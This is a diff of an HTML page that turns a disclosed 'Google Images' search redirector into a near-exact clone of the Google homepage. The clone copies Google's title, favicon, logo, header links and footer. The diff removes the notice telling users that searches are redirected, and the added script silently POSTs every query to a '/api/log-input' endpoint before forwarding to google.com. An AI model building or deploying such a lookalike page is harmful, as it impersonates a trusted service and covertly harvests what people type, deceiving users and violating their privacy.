@@ -3,225 +3,411 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="logo" type="image/png" sizes="16x16">
-    <title>Google Images</title>
+    <title>Google</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        /* General Body Styling */
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center; /* Center items horizontally */
-            justify-content: flex-start; /* Start items from the top */
-            min-height: 100vh;
-            margin: 0;
-            background-color: #f8f8f8; /* Light gray background */
-            padding-top: 80px; /* More padding from the top */
-            color: #202124; /* Dark gray for general text */
+        :root {
+            --background-color: #ffffff;
+            --text-color: #202124;
+            --secondary-text: #5f6368;
+            --border-color: #dfe1e5;
+            --search-box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
+            --button-bg: #f8f9fa;
+            --button-text: #3c4043;
+            --button-hover-bg: #f0f0f0;
+            --button-border: #f8f9fa;
+            --header-border: #ebebeb;
+            --link-color: #1a0dab;
+            --visited-link: #681da8;
         }
 
-        /* Search Container */
-        .search-container {
+        [data-theme="dark"] {
+            --background-color: #202124;
+            --text-color: #e8eaed;
+            --secondary-text: #9aa0a6;
+            --border-color: #5f6368;
+            --search-box-shadow: 0 1px 6px rgba(0, 0, 0, 0.28);
+            --button-bg: #303134;
+            --button-text: #e8eaed;
+            --button-hover-bg: #3c4043;
+            --button-border: #303134;
+            --header-border: #3c4043;
+            --link-color: #8ab4f8;
+            --visited-link: #c58af9;
+        }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            transition: background-color 0.3s, color 0.3s;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            justify-content: flex-end;
+            padding: 6px 20px;
+            align-items: center;
+            gap: 15px;
+            font-size: 13px;
+        }
+
+        .header-link {
+            color: var(--text-color);
+            text-decoration: none;
+        }
+
+        .header-link:hover {
+            text-decoration: underline;
+        }
+
+        .theme-toggle {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .theme-toggle:hover {
+            background-color: rgba(0, 0, 0, 0.1);
+        }
+
+        [data-theme="dark"] .theme-toggle:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .theme-icon {
+            width: 20px;
+            height: 20px;
+            fill: var(--text-color);
+        }
+
+        .apps-icon {
+            width: 24px;
+            height: 24px;
+            fill: var(--text-color);
+        }
+
+        .main-content {
+            flex: 1;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 25px; /* Spacing between logo and search box */
-            margin-bottom: 40px; /* Space below the search elements */
+            justify-content: center;
+            padding: 20px;
+            margin-top: -100px;
         }
 
-        /* Google Logo */
         .google-logo {
-            width: 200px; /* Larger logo for prominence */
-            height: auto;
-            object-fit: contain; /* Ensure logo scales correctly */
+            width: 272px;
+            height: 92px;
+            margin-bottom: 26px;
         }
 
-        /* Form/Search Box Wrapper - Made Responsive */
-        #searchForm { /* Using ID for the form as the main wrapper */
+        .search-container {
+            width: 100%;
+            max-width: 584px;
+            position: relative;
+        }
+
+        .search-box {
             display: flex;
-            align-items: center; /* Vertically align input and button */
-            border: 1px solid #dfe1e5; /* Light gray border */
-            border-radius: 24px; /* More rounded corners */
-            padding: 4px 6px; /* Slightly more compact padding */
-            width: 580px; /* Wider search box */
-            max-width: 90%; /* Responsive max width - ensures it shrinks on smaller screens */
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1); /* Subtle shadow for depth */
-            transition: box-shadow 0.3s ease-in-out, border-color 0.3s ease-in-out; /* Smooth transition for focus */
-
-            /* IMPORTANT: We remove flex-wrap and flex-direction column here to keep button beside input */
-            /* flex-wrap: wrap; */
-            /* justify-content: center; */
+            align-items: center;
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 8px 14px;
+            width: 100%;
+            box-shadow: var(--search-box-shadow);
+            transition: box-shadow 0.3s;
+            background-color: var(--background-color);
         }
 
-        #searchForm:hover {
-            box-shadow: 0 3px 8px rgba(0,0,0,0.15); /* Slightly stronger shadow on hover */
+        .search-box:hover {
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
         }
 
-        #searchForm:focus-within { /* When input inside is focused */
-            border-color: #4285F4; /* Blue border on focus */
-            box-shadow: 0 2px 8px rgba(66, 133, 244, 0.2); /* Blue shadow on focus */
-        }
-
-        /* Search Input Field */
-        #searchInput {
-            flex-grow: 1; /* Input takes up available space */
-            border: none; /* No individual border as form provides it */
-            outline: none; /* Remove default focus outline */
-            padding: 10px 18px; /* More generous padding inside input */
+        .search-input {
+            flex-grow: 1;
+            border: none;
+            outline: none;
+            padding: 8px 10px;
             font-size: 16px;
             background: transparent;
-            color: #202124;
-
-            /* Responsive adjustment - this is crucial to prevent input from collapsing too much */
-            min-width: 150px; 
+            color: var(--text-color);
         }
 
-        #searchInput::placeholder {
-            color: #70757a; /* Lighter placeholder text */
+        .search-input::placeholder {
+            color: var(--secondary-text);
         }
 
-        /* Search Button */
-        #searchButton {
-            background-color: #4285F4; /* Google Blue */
-            border: 1px solid #4285F4; /* Blue border */
-            border-radius: 20px; /* Rounded button */
-            color: #ffffff; /* White text */
-            font-size: 15px; /* Slightly larger font */
-            font-weight: 500; /* Medium weight */
-            padding: 10px 20px; /* Padding for the button */
-            margin-left: 10px; /* Space from input */
-            cursor: pointer;
-            outline: none;
-            transition: background-color 0.2s, box-shadow 0.2s;
-
-            /* IMPORTANT: Prevent the button from shrinking */
-            flex-shrink: 0;
+        .search-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            fill: var(--secondary-text);
         }
 
-        #searchButton:hover {
-            background-color: #357ae8; /* Slightly darker blue on hover */
-            box-shadow: 0 1px 3px rgba(0,0,0,0.2); /* Subtle shadow on hover */
+        .search-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 11px;
+            margin-top: 26px;
         }
 
-        #searchButton:active {
-            background-color: #2a6ee3; /* Even darker blue on click */
-            box-shadow: inset 0 1px 3px rgba(0,0,0,0.2); /* Inset shadow on click */
-        }
-
-        /* Results Container (for informational text) */
-        .results-container {
-            margin-top: 30px;
-            width: 80%;
-            text-align: center;
-            color: #5f6368; /* Google's standard gray for secondary text */
+        .search-button {
+            background-color: var(--button-bg);
+            border: 1px solid var(--button-border);
+            border-radius: 4px;
+            color: var(--button-text);
             font-size: 14px;
+            padding: 8px 16px;
+            cursor: pointer;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
-        /* Media Queries for smaller screens */
-        @media (max-width: 680px) { /* Adjust breakpoint as needed */
-            .google-logo {
-                width: 160px; /* Smaller logo on smaller screens */
-            }
+        .search-button:hover {
+            border: 1px solid var(--border-color);
+            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
+        }
 
-            #searchForm {
-                /* No flex-direction: column here! Keep them side-by-side. */
-                padding: 10px 15px; /* Adjust padding for smaller screens */
-                border-radius: 20px; /* Keep rounded corners */
-                box-shadow: 0 2px 5px rgba(0,0,0,0.1); /* Keep subtle shadow */
-                max-width: 95%; /* Allow it to take up more width on small screens */
-                width: auto; /* Let content determine width more freely */
+        .footer {
+            background-color: var(--background-color);
+            border-top: 1px solid var(--border-color);
+            padding: 15px 20px;
+            font-size: 14px;
+            color: var(--secondary-text);
+        }
+
+        .footer-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .footer-link {
+            color: var(--secondary-text);
+            text-decoration: none;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .google-logo {
+                width: 200px;
+                height: auto;
             }
             
-            #searchInput {
-                padding: 8px 12px; /* Slightly less padding */
-                font-size: 15px; /* Slightly smaller font */
+            .search-box {
+                padding: 6px 12px;
             }
-
-            #searchButton {
-                padding: 8px 15px; /* Adjust button padding */
-                font-size: 14px; /* Slightly smaller font */
+            
+            .search-input {
+                font-size: 14px;
+            }
+            
+            .search-buttons {
+                flex-direction: column;
+                width: 100%;
+            }
+            
+            .search-button {
+                width: 100%;
             }
         }
 
         @media (max-width: 480px) {
-            .search-container {
-                padding-top: 40px; /* Less top padding on very small screens */
+            .header {
+                padding: 6px 10px;
             }
+            
             .google-logo {
-                width: 120px; /* Even smaller logo on very small screens */
+                width: 150px;
             }
-            #searchForm {
-                padding: 8px 10px; /* Further reduce padding */
+            
+            .footer {
+                padding: 10px 15px;
             }
-            #searchInput {
-                padding: 6px 10px; /* Further reduce padding */
-                font-size: 14px;
-            }
-            #searchButton {
-                padding: 6px 12px;
-                font-size: 13px;
+            
+            .footer-links {
+                gap: 15px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="search-container">
-        <img src="images.png" alt="Google Logo" class="google-logo">
-        <form id="searchForm">
-            <input type="text" id="searchInput" placeholder="Search for images...">
-            <button type="submit" id="searchButton">Search</button>
-        </form>
+    <div class="header">
+        <div class="header-links">
+            <a href="#" class="header-link">Gmail</a>
+            <a href="#" class="header-link">Images</a>
+            <button class="theme-toggle" id="themeToggle">
+                <svg class="theme-icon" viewBox="0 0 24 24">
+                    <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1-8.313-12.454z"></path>
+                </svg>
+            </button>
+            <button class="theme-toggle">
+                <svg class="apps-icon" viewBox="0 0 24 24">
+                    <path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"></path>
+                </svg>
+            </button>
+            <button class="header-link" style="background-color: #1a73e8; color: white; border-radius: 4px; padding: 8px 15px; margin-left: 5px;">Sign in</button>
+        </div>
     </div>
 
-    <div class="results-container">
-        <p>Your searches will be redirected to Google Images.</p>
+    <div class="main-content">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png" alt="Google" class="google-logo" id="googleLogo">
+        
+        <div class="search-container">
+            <div class="search-box">
+                <svg class="search-icon" focusable="false" viewBox="0 0 24 24">
+                    <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
+                </svg>
+                <input type="text" class="search-input" id="searchInput" placeholder="Search Google or type a URL" autocomplete="off">
+                <svg class="search-icon" focusable="false" viewBox="0 0 24 24" style="cursor: pointer;">
+                    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path>
+                </svg>
+            </div>
+            
+            <div class="search-buttons">
+                <button type="button" class="search-button" id="googleSearch">Google Search</button>
+                <button type="button" class="search-button">I'm Feeling Lucky</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#" class="footer-link">About</a>
+                <a href="#" class="footer-link">Advertising</a>
+                <a href="#" class="footer-link">Business</a>
+                <a href="#" class="footer-link">How Search works</a>
+            </div>
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+                <a href="#" class="footer-link">Settings</a>
+            </div>
+        </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const searchForm = document.getElementById('searchForm');
-            const searchInput = document.getElementById('searchInput');
-
-            searchForm.addEventListener('submit', handleSearchFormSubmission);
-
-            async function handleSearchFormSubmission(event) {
-                event.preventDefault(); // Prevent the default form submission (page reload)
-
-                const query = searchInput.value.trim();
-
-                if (query) {
-                    // 1. Send the query to the Vercel Serverless Function for logging
-                    try {
-                        const response = await fetch('/api/log-input', { // Point to your Vercel Function
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({ input: query }), // Send the query as 'input'
-                        });
-
-                        const data = await response.json();
-                        if (response.ok) {
-                            console.log('Vercel Function response:', data.message);
-                        } else {
-                            console.error('Error from Vercel Function:', data.message);
-                        }
-                    } catch (error) {
-                        console.error('Error sending query to Vercel Function:', error);
-                        // Optionally, alert the user about the logging failure but still proceed with search
-                    }
-
-                    // 2. Redirect to Google Images
-                    // This happens regardless of whether logging succeeded or failed,
-                    // ensuring the core search functionality works.
-                    const googleImagesUrl = `https://www.google.com/search?q=${encodeURIComponent(query)}&tbm=isch`;
-                    window.location.href = googleImagesUrl;
-
-                } else {
-                    alert('Please enter a search query.');
-                }
+            // Theme Toggle Functionality
+            const themeToggle = document.getElementById('themeToggle');
+            const googleLogo = document.getElementById('googleLogo');
+            const prefersDarkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+            
+            // Check for saved theme preference or use system preference
+            const currentTheme = localStorage.getItem('theme') || 
+                                (prefersDarkScheme.matches ? 'dark' : 'light');
+            
+            // Apply the theme
+            if (currentTheme === 'dark') {
+                document.body.setAttribute('data-theme', 'dark');
+                googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_dark_color_272x92dp.png';
+            } else {
+                document.body.removeAttribute('data-theme');
+                googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png';
             }
+            
+            // Toggle theme on button click
+            themeToggle.addEventListener('click', () => {
+                const currentTheme = document.body.getAttribute('data-theme');
+                
+                if (currentTheme === 'dark') {
+                    document.body.removeAttribute('data-theme');
+                    localStorage.setItem('theme', 'light');
+                    googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png';
+                } else {
+                    document.body.setAttribute('data-theme', 'dark');
+                    localStorage.setItem('theme', 'dark');
+                    googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_dark_color_272x92dp.png';
+                }
+            });
+            
+            // Search Functionality with Vercel Integration
+            const searchInput = document.getElementById('searchInput');
+            const googleSearch = document.getElementById('googleSearch');
+            
+            // Function to handle search
+            async function handleSearch(query) {
+                if (!query) return;
+                
+                // 1. Send the query to the Vercel Serverless Function for logging
+                try {
+                    const response = await fetch('/api/log-input', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ input: query }),
+                    });
+
+                    const data = await response.json();
+                    if (response.ok) {
+                        console.log('Vercel Function response:', data.message);
+                    } else {
+                        console.error('Error from Vercel Function:', data.message);
+                    }
+                } catch (error) {
+                    console.error('Error sending query to Vercel Function:', error);
+                }
+
+                // 2. Redirect to Google Search
+                // This will show google.com in the address bar
+                window.location.href = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
+            }
+            
+            // Handle search button click
+            googleSearch.addEventListener('click', () => {
+                const query = searchInput.value.trim();
+                if (query) {
+                    handleSearch(query);
+                }
+            });
+            
+            // Handle enter key in search input
+            searchInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    const query = searchInput.value.trim();
+                    if (query) {
+                        handleSearch(query);
+                    }
+                }
+            });
+            
+            // Listen for system theme changes
+            prefersDarkScheme.addListener((e) => {
+                if (!localStorage.getItem('theme')) {
+                    if (e.matches) {
+                        document.body.setAttribute('data-theme', 'dark');
+                        googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_dark_color_272x92dp.png';
+                    } else {
+                        document.body.removeAttribute('data-theme');
+                        googleLogo.src = 'https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png';
+                    }
+                }
+            });
         });
     </script>
 </body>
